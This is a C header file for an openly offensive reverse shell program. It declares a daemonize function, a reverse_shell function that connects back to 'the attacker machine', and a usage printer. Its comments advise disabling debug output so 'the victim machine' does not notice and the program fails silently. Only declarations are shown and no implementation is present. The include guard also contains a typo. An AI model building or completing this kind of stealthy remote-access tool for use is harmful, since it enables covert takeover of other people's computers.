#ifndef REVERSE_SHELL_H
#define RVERSE_SHELL_H 


#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>


// uncomment the line below to allow for debug prints,however remember to comment them for live testing
// you don't really want the victim machine to see your debug prints,fail silently

// #define DEBUG 1




#ifdef DEBUG

#define PRINT_DEBUG(msg) perror(msg)

#else

#define PRINT_DEBUG(msg) printf(" ")


#endif




#define return_defer(label) goto label





// use the exposed global environment variables

extern char **environ;



/*
 *
 * detach the process and make it run as a unix daemon
 * 
 * @param1 => dir_path
 * 	directory that the daemon should run on and use it as its working directory
 * 
 *
 * @return => bool
 * 	true => success
 * 	false => failure
 *
 */



bool daemonize(const char *dir_path);




/*
 *
 *  Create a reverse shell
 *
 *  @param1 => host
 *  	ip address or domain name of the attacker machine
 *
 *  @param2 => service
 *  	port number or service name on the attckaer machine 
 *
 *  @return => bool
 * 	true => success
 * 	false => failure
 *
 *
 */

bool reverse_shell(char *host,char *service);


/*
 *
 *  Print USage information when the user does use the the program correctly
 *
 *  @param1 => argv
 *  	the commandline arguments passed in the main function
 *
 *  @return => int
 *  	the number of characters printed
 *
 *
 */


int print_usage(char **argv);

#endif
